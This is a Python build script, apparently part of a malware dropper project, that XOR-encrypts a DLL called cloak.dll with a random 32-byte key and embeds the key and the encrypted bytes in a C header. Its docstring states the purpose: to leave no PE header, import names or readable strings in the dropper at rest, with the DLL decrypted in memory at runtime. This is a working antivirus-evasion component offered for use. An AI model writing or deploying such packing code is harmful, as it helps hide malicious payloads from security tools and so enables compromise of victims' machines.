"""
gen_payload.py — Convert cloak.dll to encrypted embeddable C byte array
22DIV / george wu

Encrypts the entire DLL with a rolling XOR key so no MZ header,
no PE sections, no import names, no readable strings survive in
the dropper binary at rest. Decrypted in memory at runtime.
"""
import os
import sys
import secrets

PAYLOAD_KEY_LEN = 32


def generate(dll_path, out_path):
    data = bytearray(open(dll_path, "rb").read())
    key = secrets.token_bytes(PAYLOAD_KEY_LEN)

    encrypted = bytearray(len(data))
    for i in range(len(data)):
        encrypted[i] = data[i] ^ key[i % PAYLOAD_KEY_LEN]

    with open(out_path, "w") as f:
        f.write(f"/* Auto-generated from {os.path.basename(dll_path)} ({len(data)} bytes, encrypted) */\n\n")

        f.write(f"#define CLOAK_DLL_SIZE {len(data)}\n")
        f.write(f"#define PAYLOAD_KEY_LEN {PAYLOAD_KEY_LEN}\n\n")

        f.write("static const unsigned char payload_key[] = {\n")
        line = ", ".join(f"0x{b:02X}" for b in key)
        f.write(f"    {line}\n")
        f.write("};\n\n")

        f.write("static const unsigned char cloak_dll_data[] = {\n")
        for i in range(0, len(encrypted), 16):
            chunk = encrypted[i:i+16]
            line = ", ".join(f"0x{b:02X}" for b in chunk)
            f.write(f"    {line},\n")
        f.write("};\n")

    print(f"  [+] Generated {out_path} ({len(data)} bytes, {PAYLOAD_KEY_LEN}-byte key)")


if __name__ == "__main__":
    script_dir = os.path.dirname(os.path.abspath(__file__))
    dll = os.path.join(script_dir, "bin", "cloak.dll")
    out = os.path.join(script_dir, "cloak_payload.h")
    if not os.path.exists(dll):
        print(f"  [!] {dll} not found — build cloak.dll first")
        sys.exit(1)
    generate(dll, out)
